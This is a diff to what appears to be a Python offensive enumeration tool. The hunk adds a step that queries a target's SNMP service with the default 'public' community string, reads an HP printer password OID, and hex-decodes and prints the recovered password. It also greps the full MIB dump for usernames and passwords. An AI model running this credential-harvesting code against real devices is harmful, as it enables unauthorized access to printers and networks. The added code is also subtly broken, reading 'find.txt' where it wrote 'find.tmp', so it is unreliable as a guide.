@@ -3225,14 +3225,32 @@ while True:
          catsFile("walk.tmp")      
          print("[+] Checking local ports...")
          remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
-         catsFile("walk.tmp")      
-         print("[+] Enumerating the entire MIB tree, please wait this may take sometime...")
+         catsFile("walk.tmp")
+         print("[+] Checking for printer passwords...")
+         remotCOM("snmpwalk -v 2c -c public " + TIP.rstrip(" ") + " .1.3.6.1.4.1.11.2.3.9.1.1.13.0 > printer.tmp")
+         catsFile("printer.tmp")              
+         localCOM("cat printer.tmp | tr -d '\n\r' > printer2.tmp")
+         found = linecache.getline("printer2.tmp", 1).rstrip("\n")
+         if found != "":
+            data1,data2 = found.split("BITS:")
+            printer = binascii.unhexlify(data2.replace(' ',''))
+            printer2 = str(printer)
+            printer2 = printer2.replace("b'","")
+            data3 = printer2.split('\\x13',1)[0]
+            printerpassword = data3
+            print(colored(printerpassword + "\n", colour0))         
+         print(colored("[*] Enumerating the entire MIB tree, please wait this may take sometime...", colour3))
          remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walk.tmp")    
-         print("[+] Interesting finds...")
+         print("[+] Searching for any interesting finds...")
          localCOM("grep password walk.tmp > find.tmp")
          localCOM("grep user walk.tmp >> find.tmp")
-         catsFile("find.tmp")      
-         print("[+] Enumeration file temporary saved as walk.tmp for manual perusal...")            
+         finds = linecache.getline("find.txt", 1)
+         if finds[:1] == "":
+            print("[-] No usernames or passwords were found...")
+         else:
+            catsFile("find.tmp")
+         print("[+] MIB enumeration contents...")
+         catsFile("walk.tmp")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
